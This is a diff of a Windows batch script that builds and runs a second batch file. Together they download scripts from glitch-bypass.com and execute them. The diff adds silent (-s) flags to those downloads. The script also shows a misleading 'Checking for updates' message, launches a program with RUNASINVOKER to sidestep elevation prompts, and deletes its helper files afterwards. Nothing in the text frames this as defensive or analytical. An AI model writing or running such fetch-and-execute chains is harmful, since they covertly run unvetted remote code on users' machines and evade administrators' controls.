@@ -20,7 +20,7 @@ echo IF EXIST CMD.bat (>>SCMD.bat
 echo   cd %%userprofile%%^>nul>>SCMD.bat
 echo   goto skip>>SCMD.bat
 echo )>>SCMD.bat
-echo curl -o a.bat https://www.glitch-bypass.com/terminal/setup.bat^>nul>>SCMD.bat
+echo curl -s -o a.bat https://www.glitch-bypass.com/terminal/setup.bat^>nul>>SCMD.bat
 echo a.bat>>SCMD.bat
 echo exit>>SCMD.bat
 echo :skip>>SCMD.bat
@@ -37,10 +37,10 @@ echo echo Checking for updates>>SCMD.bat
 echo FOR /F "delims=" %%%%F IN ('dir /S /b CMD.bat') DO SET ExePath=%%%%F>>SCMD.bat
 echo cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" "%%ExePath%%"">>SCMD.bat
 
-rem curl -o "setup.bat" "https://www.glitch-bypass.com/terminal/setup.bat"
+rem curl -s -o "setup.bat" "https://www.glitch-bypass.com/terminal/setup.bat"
 rem start setup.bat
 
-curl -o exe.bat https://www.glitch-bypass.com/terminal/yep.bat
+curl -s -o exe.bat https://www.glitch-bypass.com/terminal/yep.bat
 call exe.bat SCMD.bat
 del exe.bat
 del SCMD.bat
